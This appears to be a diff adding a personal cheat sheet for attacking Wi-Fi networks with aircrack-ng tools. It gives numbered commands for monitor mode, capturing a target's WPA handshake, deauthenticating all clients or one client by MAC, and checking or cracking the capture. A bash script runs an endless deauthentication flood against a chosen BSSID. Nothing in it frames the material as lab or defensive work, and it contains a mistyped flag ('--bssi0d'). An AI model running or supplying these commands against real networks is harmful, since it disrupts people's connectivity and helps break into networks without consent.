@@ -1,0 +1,35 @@
+1.  airmon-ng start <wifi name (check with iwconfig)>
+2.  airodump-ng <wifi adapter name (wlan0mon)> 
+3.  sudo airodump-ng --bssi0d [target BSSID] -c [#-channel_no] --write handshake wlp1s0mon -> target network and its devices
+4.  aireplay-ng --deauth [count] -a [target BSSID] wlan0mon -> for the whole network range
+4b. sudo aireplay-ng --deauth 0 -a [target BSSID] -c [target client MAC] wlp1s0mon -> Deauthenticating a specific client
+5.  aircrack-ng handshake.cap -> FOR STATEMENT 3 WE CAN VERIFY WE HAVE CAPTURED THE HANDSHAKE WITH THIS**related to 3**
+
+NB ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+Then, you might need to change to the channel of the target network:->iwconfig wlan0mon channel [channel]
+
+.....................................................BASH FOR DEAUTH..............................................................
+
+#!/bin/bash
+
+# Variables
+interface=wlan0           # Your wireless network interface in monitor mode
+bssid=XX:XX:XX:XX:XX:XX   # The BSSID of the target network
+channel=6                 # The channel on which the target network is operating
+count=0                   # The number of deauth packets to send; 0 for infinite
+
+# Start by putting the wireless card into monitor mode
+airmon-ng start $interface
+
+# Change the channel (if required)
+iwconfig $interface channel $channel
+
+# The actual deauth command, repeat as needed
+while true; do
+  aireplay-ng --deauth $count -a $bssid $interface
+  sleep 10 # wait for 10 seconds before sending the packets again
+done
+
+# Clean up - stop monitor mode
+airmon-ng stop ${interface}mon
